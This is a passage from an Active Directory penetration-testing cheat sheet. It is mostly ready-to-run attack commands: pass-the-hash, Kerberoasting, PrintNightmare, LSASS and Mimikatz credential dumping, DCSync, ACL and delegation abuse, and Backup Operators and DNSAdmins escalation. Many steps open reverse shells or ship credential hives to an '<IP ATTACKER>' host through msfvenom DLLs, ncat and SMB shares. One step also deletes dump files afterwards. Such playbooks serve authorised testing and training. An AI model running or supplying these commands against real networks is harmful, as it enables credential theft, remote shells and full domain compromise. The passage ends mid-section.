	- `crackmapexec ldap/smb/mssql/rdp/winrm <IP TARGET> -u <USERNAME> -H <NT HASH> --local-auth --continue-on-success`
- **crackmapexec (domain accounts)**
	- avoid `STATUS_ACCOUNT_LOCKED_OUT`: testing credentials to a single host and then *spraying* to all of them
	- `crackmapexec ldap/smb/mssql/rdp/winrm <IP TARGET> -d <DOMAIN NAME> -u <USERNAME> -H <NT HASH> --continue-on-success`
- **evil-WinRM** (*WinRM + "Remote Management Users"*)
	- `evil-winrm -i <IP TARGET> -u <USERNAME> -H <HASH>`
- **RDP** (*RDP* + *Remote Desktop Users*)
	- `xfreerdp /d:<DOMAIN NAME> /v:<IP TARGET> /u:<USERNAME> /pth:<HASH>`
- **psexec.py**
	- `python3 psexec.py -hashes <LM HASH>:<NT HASH> <DOMAIN NAME>/<USERNAME>:@<IP TARGET>`
- **wmiexec.py** (*shell with specific user - does not make elevation to SYSTEM*)
	- `python3 wmiexec.py -hashes <LM HASH>:<NT HASH> <DOMAIN NAME>/<USERNAME>:@<IP TARGET>`
- **secretsdump.py (hash and secrets dump)**
	- `python3 secretsdump.py -hashes <LM HASH>:<NT HASH> <DOMAIN NAME>/<USERNAME>:@<IP TARGET>`
- **smbclient** (*share access*)
	- `smbclient \\\\<IP TARGET>\\<SHARE NAME> -U <USERNAME> --pw-nt-hash <NT HASH>`

## AS-REPRoasting(PostExp)

"AS-REP Roasting" is a *post-exploitation* technique intended in the sense that **it can be used to compromise an additional user** and thus expand the chances of increasing one's privileges in the domain.

**Requirements**:
- valid usernames for which the *UF_DONT_REQUIRE_PREAUTH* property is set

**Steps**:
1. identify *AS-REP roastable* users
	- `python3 GetNPUsers.py '<DOMAIN NAME>/<USERNAME>:<PASSWORD>' -dc-ip <IP DC>`
2. get *AS-REP* ticket for vulnerable user
	- `python3 GetNPUsers.py '<DOMAIN NAME>/<USERNAME>:<PASSWORD>' -dc-ip <IP DC> -request'`
3. *AS-REP* ticket cracking
	- `hashcat -m 18200 <AS-REP.txt> <wordlist>`

Alternatively, from within, you can use *Rubeus* with the following command:
- `.\Rubeus.exe asreproast /nowrap`
- output is directly compatible for cracking with *hashcat*

## Kerberoasting

**Requirements**:
- domain user accounts associated with SPN

**Note**: TGSs of SPNs associated with "krbtgt" account, "computer account", "managed service account" or "managed service account" are indeed crackable. To check for "managed service account" and "managed service account": `Get-ADServiceAccount -Filter *` (requires *AD RSAT*).

**Steps**:
- get *TGS*
	- *remotely*: `python3 GetUserSPNs.py <DOMAIN NAME>/<USERNAME>:<PASSWORD> -dc-ip <IP DC> -request`
	- *from within* 
		- (Rubeus) `.\Rubeus.exe kerberoast /user:<USERNAME> /outfile:hashes.kerberoast`
		- (PowerView) `Request-SPNTicket -SPN "<SPN>" -Format Hashcat`
- *cracking*
	- `hashcat -m 13100 <TGS.txt> <wordlist>`

Check ***always*** SPN associated with the *kerberoastable* account: it can be a clue we can use to figure out which machine/application the user can access.

Alternatively, from the inside, you can use *Rubeus* with the following command:
- `.\Rubeus.exe kerberoast /outfile:hashes.kerberoast`
- output is directly compatible for cracking with *hashcat*

## GroupPolicyPreferences

**Requirements**:
- target vulnerable to MS14-025

**Steps**:
- *remotely*
	- (*via Pass the Password*) `Get-GPPPassword.py <DOMAIN NAME>/'<USERNAME>:<PASSWORD>'@<IP DC>`
	- (*via Pass the Hash*) `Get-GPPPassword.py -hashes <LM HASH>:<NT HASH> <DOMAIN NAME>/<USERNAME>:@<IP DC>`
- *upload to target*
	- [https://raw.githubusercontent.com/vysecurity/ps1-toolkit/master/Invoke-GPPPassword.ps1](https://raw.githubusercontent.com/vysecurity/ps1-toolkit/master/Invoke-GPPPassword.ps1)
	- `powershell -ep bypass`
	- `. .\Invoke-GPPPassword.ps1`
	- `Get-GPPPassword`

**Note**: The "Invoke-GPPPassword.ps1" script searches within the DC's "SYSVOL" share for XML files with a specific name that contain "cpassword." Since the file name can be arbitrary, it would be preferable to locate all the XML files present and then search for the string "password" in their contents.

## PrintNightmare

**Requirements**:
- domain user account credentials, regardless of its privileges
- **DC unpatched or misconfigured**. Vulnerable versions:
	- Windows Server (2004, 2008, 2008 R2, 2012, 2012 R2, 2016, 2019, 20H2)
	- Windows (7, 8.1, RT 8.1, 10)

***With direct access to the machine***: a host is vulnerable **if and only if**, by running `reg query "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint"`, the following registry keys are set as follows:

```
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint
    RestrictDriverInstallationToAdministrators    REG_DWORD    0x0
    NoWarningNoElevationOnInstall    REG_DWORD    0x1
```

**NB**: a fully-patched DC, but with the registry keys set as seen above, is **newly vulnerable**.

**Steps**:
1. *checker* (*impacket*)
	- `rpcdump.py @<IP TARGET> | egrep 'MS-RPRN|MS-PAR'`
	```shell
	rpcdump.py @<IP TARGET> | egrep 'MS-RPRN|MS-PAR'
	
	Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
	Protocol: [MS-RPRN]: Print System Remote Protocol
	```
2. *reverse shell DLL*
	- `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<INTERFACE> LPORT=53 -f dll -o rev.dll`
3. *SMB server* (*impacket*)
	- `python3 smbserver.py -smb2support "pwn" <DIR with rev.dll>`
4. listener netcat
	- `rlwrap nc -nvlp 53`
5. *exploit*
	- [https://github.com/cube0x0/CVE-2021-1675](https://github.com/cube0x0/CVE-2021-1675)
	- `python3 CVE-2021-1675.py <DOMAIN NAME>/'<USERNAME>:<PASSWORD>'@<IP TARGET> '\\<IP ATTACKER>\pwn\rev.dll'`

**Local PE Powershell** - [https://github.com/calebstewart/CVE-2021-1675](https://github.com/calebstewart/CVE-2021-1675):
- `powershell -ep bypass`
- `. .\CVE-2021-1675.ps1`
- `Invoke-Nightmare` (*add user `adm1n`/`P@ssw0rd` in the local admin group by default*)

## PassTheTicket

**Scenario**: attack that relies on Kerberos authentication. It is based on the reuse of Kerberos tickets (and associated session keys) in the memory of the LSASS process.

**Requirements**:
- *local admin* user required to extract all TGTs and/or TGSs from the memory of the LSASS process
- without privileged user we can only get TGT and TGS for the current user

**Steps (without privileged user**):
1. get TGT current user
	- `python3 getTGT.py -dc-ip <IP DC> -hashes :<HASH NT> <DOMAIN NAME>/<USERNAME>`
2. `export KRB5CCNAME=</path/to/USERNAME.ccache>`
3. ticket usage (to abuse the ticket in memory communicate with the target via ***hostname***. Use of "hostname" force Kerberos authentication) - example: `python3 psexec.py -dc-ip <IP DC> -target-ip <IP TARGET> -no-pass -k <DOMAIN NAME>/<USERNAME>@<HOSTNAME TARGET>` (caso reale: `psexec.py -dc-ip 192.168.1.105 -target-ip 192.168.1.105 -no-pass -k ignite.local/yashika@WIN-S0V7KMTVLD2.ignite.local`)

**Steps (privileged user**):
1. we connect to the `C$` share of the target machine (`python3 smbclient.py <DOMAIN NAME>/<USERNAME>@<IP TARGET>`, *password via prompt*) and load the executable of [Procdump](https://learn.microsoft.com/en-us/sysinternals/downloads/procdump):
	- `use C$`
	- `cd Windows`
	- `cd Temp`
	- `put </path/to/procdump/.exe>`
2. *LSASS dumping remotely*
	- `python3 psexec.py <DOMAIN NAME>/<USERNAME>@<IP TARGET> "C:\\Windows\\Temp\\procdump.exe -accepteula -ma lsass C:\\Windows\\Temp\\lsass.dmp"` (require: *ErrorCode: 0, ReturnCode: 1*)
3. we connect to the target (`python3 smbclient.py <DOMAIN NAME>/<USERNAME>@<IP TARGET>`, *password via prompt*), download the dump and delete the files created:
	- `use C$`
	- `cd Windows`
	- `cd Temp`
	- `get lsass.dmp`
	- `rm procdump.exe`
	- `rm lsass.dmp`
4. create folder that will contain Kerberos tickets
	- `mkdir /tmp/kerb`
5. Kerberos ticket dump via `pypykatz`
	- `pypykatz lsa minidump -k /tmp/kerb /path/to/lsass.dmp`
6. we convert the format of the chosen ticket from *.kirbi* to *.ccache* with `ticket_converter.py` (*impacket*)
	- `python3 ticketConverter.py </path/to/ticket.kirbi> </output/path/to/ticket.ccache>`
7. `export KRB5CCNAME=</path/to/TGT.ccache>`
8. ticket usage (to abuse the ticket in memory communicate with the target via ***hostname***. Use of "hostname" force Kerberos authentication) - example: `python3 psexec.py -debug -no-pass -dc-ip <IP DC> -target-ip <IP TARGET> -k <DOMAIN NAME>/<USERNAME>@<HOSTNAME TARGET>.<DOMAIN NAME>`

## OverpassTheHash/PassTheKey

**Context**: 
1. similar attack to *PtH*, but applied in Kerberos authentication
2. when a user requests a TGT, it sends a timestamp encrypted with a key derived from its password (*AS-REQ*). The algorithm used to derive this key can be DES (disabled in current versions of Windows), RC4, AES128, or AES256, depending on the version of Windows installed and the Kerberos configuration
3. if we have one of these keys, we can request a TGT from the KDC on behalf of a user without knowing their password, hence the name **Pass-the-Key**
4. since the Kerberos RC4 key == user NT hash, when we use NT hash to request a Kerberos ticket the attack takes the name **Overpass-the-Hash**

**Requirements**:
- *local admin* user required to extract Kerberos keys from the memory of the LSASS process

**Steps**:
1. TGT request:
	- *via hash*: `python3 getTGT.py <DOMAIN NAME>/<USERNAME> -dc-ip <IP DC> -hashes :<NT HASH>`
	- *via AES key*: `python3 getTGT.py <DOMAIN NAME>/<USERNAME> -dc-ip <IP DC> -aesKey <AES KEY>`
	- *via password*: `python3 getTGT.py -dc-ip <IP DC> <DOMAIN NAME>/<USERNAME>:<PASSWORD>`
2. specific TGT chosen
	- `export KRB5CCNAME=</path/to/TGT.ccache>`
3. ticket usage (to abuse the ticket in memory communicate with the target via ***hostname***. Use of "hostname" force Kerberos authentication) - example: `python3 psexec.py -debug -no-pass -dc-ip <IP DC> -target-ip <IP TARGET> -k <DOMAIN NAME>/<USERNAME>@<HOSTNAME TARGET>.<DOMAIN NAME>`

## DCSync

The attack, if the pre-requisites are met, allows NT hashes of any domain user to be obtained.

**Requirements**:
- user who is a member of the **Domain Admins** or **Enterprise Admins** or **Administrators** or **Domain Controllers** groups or user with the following privileges: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** and **Replicating Directory Changes** in **Filtered Set**.

**Steps**:
1. remote attack:
	- *via pass the password*:
		- `python3 secretsdump.py -outputfile 'dcsync.txt' '<DOMAIN NAME>/<USERNAME>:<PASSWORD>@<IP DC>'`
		- (*single user*) `python3 secretsdump.py -just-dc-user <WE_WANT_NTHASH_OF_THIS_USERNAME> '<DOMAIN NAME>/<USERNAME>:<PASSWORD>@<IP DC>'`
	- *via pass the hash*:
		- `python3 secretsdump.py -outputfile 'dcsync.txt' -hashes '<LM hash>':'<NT hash>' '<DOMAIN NAME>/<USERNAME>@<IP DC>'`
2. from within: *mimikatz*

## GPOabuse

Enumeration (*PowerView*):
- All GPOs
	- `Get-NetGpo | select DisplayName, whenchanged`
- detailed info about a GPO
	- `Get-GPO -Name "<DISPLAY NAME GPO>"`
- permissions of our user on the GPO
	- `Get-GPPermission -Guid "<ID GPO>" -TargetType User -TargetName <USER OWNED>`

*Abusing*: we assume that the permission is `GpoEditDeleteModifySecurity`. This means that we can edit the GPO! The tool to use is: [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse).

Exploitation:
- add a *local admin* user: 
	1. `.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <USER OWNED> --GPOName "<VULNERABLE GPO>"`
	2. `gpupdate /force`
	3. access with *psexec* to get a SYSTEM shell

## AbusingGroupManagedServiceAccounts

**Info**:
- [https://blog.netwrix.com/2022/10/13/group-managed-service-accounts-gmsa/](https://blog.netwrix.com/2022/10/13/group-managed-service-accounts-gmsa/)
- [https://www.thehacker.recipes/a-d/movement/dacl/readgmsapassword](https://www.thehacker.recipes/a-d/movement/dacl/readgmsapassword)
- "*BloodHound*" can detect this misconfiguration: "*Node Info*" > "*OUTBOUND OBJECT CONTROL*" > "*Group Delegated Object Control*"

**Tools**:
- ability to run the *cmdlets* of the [Active Directory PowerShell module](#PowershellADModule)
- an executable of [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)

**Steps**:
1. check for the presence of "*Group Managed Service Accounts*" or "*gMSA*" accounts
	- `Get-ADServiceAccount -Filter *`
2. identify who can read the password of an "*gMSA*" account
	- `Get-ADServiceAccount -Filter * -Properties PrincipalsAllowedToRetrieveManagedPassword`
	- **requirement**: user we have control of must be present as a user or group in "*PrincipalsAllowedToRetrieveManagedPassword*". If yes, we continue
3. (optional) identify which groups the user "*gMSA*" belongs to.
	- `Get-ADServiceAccount -Filter * -Properties memberof`
4. (optional) we use the script [gMSA_Permissions_Collection.ps1](https://gist.githubusercontent.com/kdejoyce/f0b8f521c426d04740148d72f5ea3f6f/raw/714f6ec0a84a3e5ad6d6dffcf18bd56d1474ea26/gMSA_Permissions_Collection.ps1)(modify the variable `$target`) to see which AD objects have "Full Control", "Write All Properties" or "Write" privileges on the "*gMSA*" account
5. permission to be able to read the account password "*gMSA*" is checked
	- `Get-ADServiceAccount -identity "<gMSA name>" -Properties msds-ManagedPassword`
6. we obtain the hashes related to the account password "*gMSA*"
	- `.\GMSAPasswordReader.exe --AccountName "<gMSA name>"`
7. abusing new credentials via *Pass-The-Hash* (RC4 == hash NT)

## TokenImpersonation

**Requirements**:
- *local admin* user credentials of target machine (needed to dump LSASS)

**Steps**:
1. token enumeration - (**add `--local-auth` if you have *local admin* user credentials**)
	- `crackmapexec smb <IP TARGET> -u administrator -H <HASH NT Administrator> -M impersonate -o MODULE=list`
2. token impersonation of privileged user - (**add `--local-auth` if you have local *local admin* user credentials**)
	- `crackmapexec smb <IP TARGET> -u administrator -H <HASH NT Administrator> -M impersonate -o MODULE=exec TOKEN=<Primary token ID user> EXEC=whoami`
3. shell with privileged user - (**add `--local-auth` if you have *local admin* user credentials**)
	- `crackmapexec smb <IP TARGET> -u administrator -H <HASH NT Administrator> -M impersonate -o MODULE=exec TOKEN=<Primary token ID user> EXEC="powershell.exe -e <BASE64REVSHELL>"`

## AbusingActiveDirectoryCertificateServices

**Steps**:
1. *enumeration* - [Certipy](https://github.com/ly4k/Certipy) is an offensive tool for enumerating and abusing Active Directory Certificate Services (AD CS)
2. *exploitation* - a great resource that explains how abusing of a specified misconfiguration is available at [https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation)

## Mimikatz

Release: [https://github.com/gentilkiwi/mimikatz/releases](https://github.com/gentilkiwi/mimikatz/releases)

**Requirements**:
- user who is a member of the *Administrators* group for most commands

**Tips**:
- *one-line command*: 
	- `.\mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit`

### ExtractingSecrets

**Info**:
- `"token::elevate"` is needed when we need to elevate our privileges to accomplish a certain command. Typical use is when we run *mimikatz* as Administrator and need to elevate privileges to SYSTEM. Ideally, if we already have a shell with SYSTEM (example: via *psexec.py*) we do not need to

- NT hashes from local SAM (*tips: hashcat mode is 1000*)
	- `.\mimikatz "privilege::debug" "token::elevate" "lsadump::sam" exit`
- NT hashes from LSASS
	- (only LM and NT hash) `.\mimikatz "privilege::debug" "token::elevate" "sekurlsa::msv" exit`
	- (credentials from all providers) `.\mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit`
- Kerberos Ticket
	- (*listing*) `.\mimikatz "privilege::debug" "sekurlsa::tickets" exit`
	- (*export*) `.\mimikatz "privilege::debug" "sekurlsa::tickets /export" exit`
- Kerberos Keys
	- `.\mimikatz "privilege::debug" "sekurlsa::ekeys" exit`
- LSA secrets
	- `.\mimikatz "privilege::debug" "lsadump::secrets" exit`
	- `.\mimikatz "privilege::debug" "lsadump::cache" exit`
- tokens
	- `.\mimikatz "privilege::debug" "token::list" exit`

### PassTheHashMimikatz

**Steps**:
1. `mimikatz.exe`
2. `privilege::debug`
3. `token::elevate`
4. *NT hashes dumping*:
	- **from SAM**: `lsadump::sam`
	- **from LSASS**: `sekurlsa::msv` (*NT hashes dumping of any local users and domain users logged recently in the machine*)
5. `token::revert`
6. *netcat* listener: `nc -nvlp 53`
7. `sekurlsa::pth /user:<USERNAME> /domain:<DOMAIN NAME> /ntlm:<NT HASH> /run:"c:\tools\ncat.exe -e cmd.exe <IP ATTACKER> 53"`
8. shell received by the listener will contain in memory the access token of the domain user `<USERNAME>`. We can connect to the target machine and get a shell:
	- `winrs.exe -r:<HOSTNAME TARGET> cmd` (*winrs* only works well from CMD)

### PassTheTicketMimikatz

**Steps**:
1. `mimikatz.exe`
2. `privilege::debug`
3. **next command exports all TGT and/or TGS tickets** to the current directory as a .kirbi file. The file names start with the LUID of the user and the group number (0 = TGS, 1 = client ticket(?) and 2 = TGT). We are obviously interested in tickets of privileged users, such as *Administrator* or *Domain Admins* users
4. `sekurlsa::tickets /export`
5. `kerberos::ptt <TICKET.kirbi>`
6. `exit`
7. **ticket is injected into memory and available for any tool for *lateral movement***. To check whether the tickets have been injected correctly: `klist`
8. *lateral movement* with `winrs` (to abusing of ticket injected into memory we need to comunicate with target via ***hostname***. Use of hostname forces Kerberos authentication): `winrs.exe -r:<HOSTNAME TARGET> cmd` (*winrs* only works well from CMD)

To delete all tickets injected with *mimikatz*: `kerberos::purge`. 

### OverpassTheHash/PassTheKeyWithMimikatz

When an user requests a TGT, it sends a timestamp encrypted with key derived from his password. Algorithm user to derive such key could be DES (is disabled in current versions of Windows), RC4, AES128 or AES256, depending on the version of Windows installed and on configuration of Kerberos. If we have one of these keys, we can request a TGT from the KDC on behalf of a user without knowing his password, hence the name **Pass-the-Key**.

**Steps**:
1. `mimikatz.exe`
2. `privilege::debug`
3. `sekurlsa::ekeys`
4. *netcat* listener: `nc -nvlp 53`
5. depending of available of keys, we can get a shell via *Pass-the-Key*:
	- **RC4 (== hash NT)**: `sekurlsa::pth /user:<USERNAME> /domain:<DOMAIN NAME> /rc4:<KERBEROS RC4> /run:"c:\tools\ncat.exe -e cmd.exe <IP ATTACKER> 53"`
	- **AES128**: `sekurlsa::pth /user:<USERNAME> /domain:<DOMAIN NAME> /aes128:<KERBEROS AES128> /run:"c:\tools\ncat.exe -e cmd.exe <IP ATTACKER> 53"`
	- **AES256**: `sekurlsa::pth /user:<USERNAME> /domain:<DOMAIN NAME> /aes256:<KERBEROS AES256> /run:"c:\tools\ncat.exe -e cmd.exe <IP ATTACKER> 53"`
6. shell received by the listener will contain in memory the access token of the domain user `<USERNAME>`. We can connect to the target machine and get a shell:
	- `winrs.exe -r:<HOSTNAME TARGET> cmd` (*winrs* works well from CMD)
	- in the "new" shell, with `klist` it is quite normal to see that there are no cached tickets given you have to perform an authentication to generate the TGT
	- command with *winrs* works because, thanks to the ticket, it is as if I were the user `<USERNAME>`
	- to abusing of ticket injected into memory we need to comunicate with target via ***hostname***. Use of hostname forces Kerberos authentication

To delete all tickets injected with *mimikatz*: `kerberos::purge`. 

### TokenImpersonationMimikatz

**Steps**:
1. `mimikatz.exe`
2. `privilege::debug`
3. token enumeration on the machine: `token::list`
4. impersonate privileged user: `token::token::elevate /domainadmin` or `token::token::elevate /user:<USERNAME>`
5. upload executable reverse shell
6. *netcat* listener: `nc -nvlp 80`
7. get a shell with the impersonated user: `token::run /process:"C:\absolute\path\to\shell.exe"`

### SilverTicketsMimikatz

**Requirements**: compromise of an account associated with a service and we are able to issue TGS. This can be useful when you need to access the service or a resource at an Application Server and need to impersonate a privileged user.

**Steps**:
1. `mimikatz.exe`
2. `privilege::debug`
3. `kerberos::golden /sid:<DOMAIN SID> /domain:<DOMAIN NAME> /ptt /target:<FULL TARGET SPN> /service:<SPN PROTOCOL> /rc4:<SERVICE ACCOUNT HASH NT> /user:<PRIVILEGED USERNAME TO IMPERSONATE>`
4. **NB**: to take advantage of the silver ticket injected in memory, we need comunicate with the target via ***hostname*** (use of hostname forces Kerberos authentication)

To delete all tickets injected with *mimikatz*: `kerberos::purge`. 

### DCSyncMimikatz

**Requirements**:
- user Domain Admins group's member
- a shell on Domain Controller

**Steps**:
1. `mimikatz.exe`
2. (*all users*) `lsadump::dcsync /dc:<HOSTNAME DC>.<DOMAIN NAME> /domain:<DOMAIN NAME> /all`
3. (*specified user*) `lsadump::dcsync /domain:<DOMAIN NAME> /user:<USERNAME>`

## AbusingACL/ACE

From an attacker's point of view, regarding permissions related to Active Directory objects, we are interessed in the following privileges:
- **GenericAll**: 
	- full control on the object
- **GenericWrite**: 
	- allow to modifying any unprotected parameter. For example, you can edit _scriptPath_ parameter, which causes a certain script to be executed the next time the user logs on. As alternative, such privilege allows adding users to a group
- **WriteOwner**: 
	- allow to edit object's owner
- **WriteDACL**: 
	- allow to write new ACE regarding DACL of a object. For example, we can add an ACE that allows us full control on the target object
- **AllExtendedRights**: 
	- allow any action associated with extended AD permissions to be forced towards an object. This can be include the possibility of forcing a change of user's password
- **ForceChangePassword**: 
	- allow to force a change of user's password without prompting current
- **Self(Self-Membership)**: 
	-  allow to add ourselves to a group

Misconfigurations relative to ACL of AD objects could bring an attacker to elevate his privileges in domain or forest. Let's do a list of common misconfigs::
- **Changing user password**:
	- *User-Force-Change-Password* or *GenericAll* 
- **Making user Kerberoasteable**:
	- *WritePropertyExtended* o *GenericWrite* o *GenericAll* required on user object. If we can write an SPN in the **ServicePrincipalName** property of a user object, the latter is in fact *kerberoastable*
- **Executing malicious scripts**:
	- *WriteProperty*, *GenericWrite* o *GenericAll* required on user object. By modifying a user's `ScriptPath` property, we can set a malicious file that will be executed the next time the user logons
- **Adding users to a group**:
	- *WriteProperty*, *GenericWrite* o *GenericAll* required on group object. By modifying the `members` property of a group, we can add any member to a group. If we have the *Self(Self-Membership)* permission, we can add the current user to a group
	- **Kerberos Resource-based Constrained Delegation**: *WriteProperty*, *GenericWrite* o *GenericAll* required on computer object. It consists of editing `msDS-AllowedToActOnBehalfOfOtherIdentity` property of a computer account
- **LAPS password**
- **DCSync attack**: 
	- if we have extended `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` permissions on a domain object, we can perform a *DCSync* attack and dump the contents of the database
- **GPO abuse**:
	- *WriteProperty*, *GenericWrite* o *GenericAll*  required on Group Policy Container. By modifying the `GPC-File-Sys-Path` property of a Group Policy Container we can modify the GPO and execute code on the computers involved in the GPO
- **Editing ACL**:
	- *WriteDacl* or *GenericAll* required. With such permissions we can create ACLs to give any permission to objects and perform any of the above attacks. Furthermore, if we have *WriteOwner* permission, since the object owner implicitly has *WriteDacl* permission, we can change the object owner to the one we control and then modify the ACLs

### KerberosResource-BasedConstrainedDelegation

**Requirements**:
- *GenericAll*/*GenericWrite*/*Write* on Computer object

Credit: [https://github.com/tothi/rbcd-attack](https://github.com/tothi/rbcd-attack).

Step 1: creating a fake computer. *addcomputer.py* from *impacket* suite can be used

```shell
python3 examples/addcomputer.py -computer-name 'evilcomputer$' -computer-pass ev1lP@sS -dc-ip <IP DC> <DOMAIN>/<USER>:<PASSWORD>
```

Step 2: abusing of  target's `msDS-AllowedToActOnBehalfOfOtherIdentity` property. *rbcd.py* from repository can be used

```shell
python3 ./rbcd.py -f EVILCOMPUTER -t <COMPUTER OBJECT HOSTNAME> -dc-ip <IP DC> <NetBIOS DOMAIN NAME>\\<USERNAME>:<PASSWORD>
```

Step 3: a *Request impersonated Service Tickets (S4U)* is required for computer target. *getST.py* from *impacket* suite can be used

```shell
python3 getST.py -spn cifs/<COMPUTER OBJECT HOSTNAME>.<DOMAIN> -impersonate Administrator -dc-ip <IP DC> <DOMAIN>/EVILCOMPUTER$:ev1lP@sS
```

Step 4: *Pass-the-Ticket* ed abuse of privilege

```shell
export KRB5CCNAME=`pwd`/administrator.ccache
python3 psexec.py -dc-ip <IP DC> -target-ip <IP TARGET> -no-pass -k <DOMAIN>/Administrator@<COMPUTER OBJECT HOSTNAME>.<DOMAIN> 
```

## ReadLAPSPassword

**Steps**:
1. a lot of methods can be used for enumeration:
	- BloodHound
	- PowerView
	- ldapsearch: `ldapsearch -v -x -D <SAMACCOUNTNAME>@<DOMAIN> -w "<PASSWORD>" -b "DC=hutch,DC=offsec" -H ldap://<IP TARGET>:<LDAP PORT> "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd`
1. cloning [https://github.com/p0dalirius/pyLAPS](https://github.com/p0dalirius/pyLAPS)
2. `python3 pyLAPS.py --action get -u <SAMACCOUNTNAME> -p '<PASSWORD>' -d '<DOMAINNAME>' --dc-ip <IP DC>`
3. we can access in the machine with Administrator user and password identified in point 2 (psexec, evil-winrm, ecc)

## GenericAllOverUser

**Requirements**:
- *GenericAll* on User object

Credit: [https://support.bloodhoundenterprise.io/hc/en-us/articles/17312347318043-GenericAll](https://support.bloodhoundenterprise.io/hc/en-us/articles/17312347318043-GenericAll)

One of options is to reset the password of the user we have complete control over. **Steps**:
1. (*optional, but preferable*) prepare my credentials for the authentication with DC
	1. `$MYPASSWORD = ConvertTo-SecureString '<MY PASSWORD>' -AsPlainText -Force`
	2.  `$MYCREDS = New-Object System.Management.Automation.PSCredential('<DOMAIN NAME>\<MY USERNAME>', $MYPASSWORD)`
2. create a new password: `$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force`
3. change the password of the user whose privilege I have *GenericAll* to the *Set-DomainUserPassword* (**requires: *PowerView***)
	- with authentication at the DC: `Set-DomainUserPassword -Identity '<VICTIM USERNAME>' -AccountPassword $UserPassword -Credential $MYCREDS`
	- without authentication at the DC (or if i don't know the `<MY USERNAME>`'s password): `Set-DomainUserPassword -Identity '<VICTIM USERNAME>' -AccountPassword $UserPassword`

## PrivilegedGroups

### AccountOperators

*Account Operators* group can edit the members of a lots of domain group, except for administrative groups. However, it is able to modify the *Server Operators* group.

To summarize:
- allow creation of not accounts and groups administrative groups
- allow locally login at DC

*"This group is considered a service administrator group because it can modify Server Operators, which in turn can modify domain controller settings. As a best practice, leave the membership of this group empty, and do not use it for any delegated administration. This group cannot be renamed, deleted, or moved."*

### AdminSDHolder

The ACLs of the **AdminSDHolder** object are used as templates to copy permissions to all 'protected groups' in AD and their members. The 'protected groups' include privileged groups such as *Domain Admins*, *Administrators*, *Enterprise Admins* and *Schema Admins*.

It is used mostly for persistance.

### ADRecycleBin

This group has privileges to read deleted AD objects. Interesting information can be found.

```shell
#This isn't a powerview command, it's a feature from the AD management powershell module of Microsoft
#You need to be in the "AD Recycle Bin" group of the AD to list the deleted AD objects
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```

### BackupOperators

Members of this group can backup and restore of files in DC (they can also log in). This could result in the modification of files in the DC. 

#### by impacket

**Steps**:
1. SMB server setup - it is used for receive files:
	- `python3 smbserver.py -smb2support "pabloshare" </PATH/TO/OUTPUT_DIR>`
2. remotely backup of SAM, SYSTEM e SECURITY hives:
	- `python3 reg.py <DOMAIN NAME>/'<USERNAME>:<PASSWORD>'@<IP DC> backup -o '\\<IP ATTACKER>\pabloshare'`
		- alternatives:
			- `python3 reg.py <DOMAIN NAME>/'<USERNAME>:<PASSWORD>'@<IP DC> save -keyName 'HKLM\SAM' -o '\\<IP ATTACKER>\pabloshare'`
			- `python3 reg.py <DOMAIN NAME>/'<USERNAME>:<PASSWORD>'@<IP DC> -keyName 'HKLM\SYSTEM' -o '\\<IP ATTACKER>\pabloshare'`
			- `python3 reg.py <DOMAIN NAME>/'<USERNAME>:<PASSWORD>'@<IP DC> -keyName 'HKLM\SECURITY' -o '\\<IP ATTACKER>\pabloshare'`
3. *secrets* dump:
	- `python3 secretsdump.py -sam </PATH/TO/SAM> -security </PATH/TO/SECURITY> -system </PATH/TO/SYSTEM> LOCAL`
4. abuse - use the computer account credentials of the DC (NT hash in `$MACHINE.ACC`)
	- *psexec* or *evilWinRM* to access to the DC
	- *secretsdump* for dumping of whole database NTDS
		- `python3 examples/secretsdump.py '<DOMAIN NAME>/<HOSTNAME DC>$'@<IP DC> -hashes <LM HASH $MACHINE.ACC>:<NT HASH $MACHINE.ACC>`

#### by "From Backup Operator To Domain Admin"

Credit: [https://github.com/mpgn/BackupOperatorToDA](https://github.com/mpgn/BackupOperatorToDA)

**Steps**:
1. cloning the repository and compiling solution with Visual Studio
2. SMB server setup - it is used for receive files:
	- `python3 examples/smbserver.py -smb2support tmp /tmp`
3. upload "BackupOperatorToDA.exe" binary on target
4. remotely backup of SAM, SYSTEM e SECURITY hives and sending to the remote share
	- `.\BackupOperatorToDA.exe -t \\<HOSTNAME DC>.<DOMAIN NAME> -u <USERNAME> -p <PASSWORD> -d <DOMAIN NAME> -o \\<IP ATTACKER>\tmp\`
5. *secrets* dump:
	- `python3 examples/secretsdump.py -sam /tmp/SAM -security /tmp/SECURITY -system /tmp/SYSTEM LOCAL`
6. abuse *computer account DC* hash (section `$MACHINE.ACC` in the output of the command in step 5)
	- `python3 examples/secretsdump.py '<DOMAIN NAME>/<HOSTNAME DC>$'@<IP DC> -hashes <LM HASH $MACHINE.ACC>:<NT HASH $MACHINE.ACC>`

### DNSAdmins

A user member of *DNSAdmins* group or who has write privileges at DNS server object can upload and execute with SYSTEM privilege an arbitrary DLL on server DNS machine. Since, very often, DCs are used as DNS servers, this means that we can execute code in DCs.

The DLL is executed when the DNS service is restarted.

**Steps**:
1. creation DLL *reverse shell*:
	- `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<INTERFACE> LPORT=53 -f dll -o reverse.dll`
2. SMB server setup - it is used to serve DLL:
	- `python3 smbserver.py -smb2support "pabloshare" </PATH/TO/OUTPUT/REVERSE.DLL>`
3. download malicious DLL:
	- `dnscmd <HOSTNAME DC> /config /serverlevelplugindll \\<IP ATTACKER>\pabloshare\reverse.dll`
4. listener *netcat* setup:
	- `nc -nvlp 53`
5. reboot DNS service:
	- `sc.exe stop dns`
	- `sc.exe start dns`

***nice to try*** (not tested):
